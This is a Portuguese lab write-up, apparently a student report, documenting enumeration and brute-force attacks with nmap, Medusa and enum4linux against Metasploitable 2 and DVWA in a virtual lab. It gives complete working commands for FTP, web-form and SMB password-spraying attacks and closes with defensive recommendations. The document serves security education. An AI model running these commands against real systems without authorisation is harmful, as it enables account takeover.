# INTRODUÇÃO
Este trabalho descreve uma prática realizada para analisar enumeração e  ataques de força bruta utilizando a ferramenta Medusa e nmap, disponibilizada no Kali Linux.
👉 O foco deste trabalho é conhecer o funcionamento desses ataques para posteriormente, desenvolver mecanismos de proteção mais eficazes.
Para conduzir os testes, foram utilizados ambientes vulneráveis e controlados, como o Metasploitable 2 e o DVWA, nos quais foram executados ataques simulados contra serviços como FTP, formulários web e SMB.

# CONFIGURANDO O AMBIENTE
Foram utilizados ambientes controlado no virtualbox
1 - Foi feito a configuração do Kali Linux e  Metasploitable 2 Ambas as VMs foram configuradas para estarem na mesma rede.
2 - Após logar as VMs descobriu-se o ip da máquina vulnerável(metasploitable 2) para os testes, usando o comando ip a.

# ATAQUE DE FORÇA BRUTA NO FTP
1 - Descobrindo portas abertas usando o comando nmap -sV -p 21,22,80,445,139 192.168.56.101
2 - Criando Wordlist usando o comando echo -e "user\nmsfadmin\nroot" > users.txt | echo -e "123456\npassword\nmsfadmin" > pass.txt
3 - Executou-se a ferramenta medusa usando o seguinte comando: medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6.
4 - Obteve-se com isso o usuário e senha para acessar via ftp.

# ATAQUE DE FORÇA BRUTA VIA WEB
1 - Abriu no navegador o site http://192.168.56.5/dvwa/login.php
2 - Verificou-se por meio da ferramenta do programador o formato da requesição.
3 - Utilizando a ferramenta medusa para fazer o ataque de força bruta com o seguinte comando: medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \ -m PAGE: '/dvwa/login.php' \ -m FORM: 'username=^USER^&password=^PASS^&Login=Login' \ -m 'FAIL=Login failed' -t 6.
4 - Dessa forma, conseguiu-se obter a senha para ter acesso ao site.

# PASSWORD SPRAYING EM SMB
1 - Utilizou-se da ferramenta enum4linux para fazer a enumeração de usuários usando o seguinte comando: enum4linux -a 192.168.56.101 | tee enum4_output.txt.
2 - Criou-se Wordlist utilizando o comando echo -e "user\nmsfadmin\nservice" > smb_users.txt e echo -e "password\n123456\nWecome123\nmsfadmin" > senhas_spray.txt
3 - Utilizou a ferramenta medusa para fazer a força bruta seguindo a lógica do password spraying usando o seguinte comando : medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
4 - Obteu-se usuario e senha como msfadmin para ambos.

# RECOMENDAÇÕES
1 - Autenticação Multifator 
2 - Monitoramento de Login
3 - Utilização de Senhas Fortes
4 - Bloqueio de contas após de tentativas inválidas.



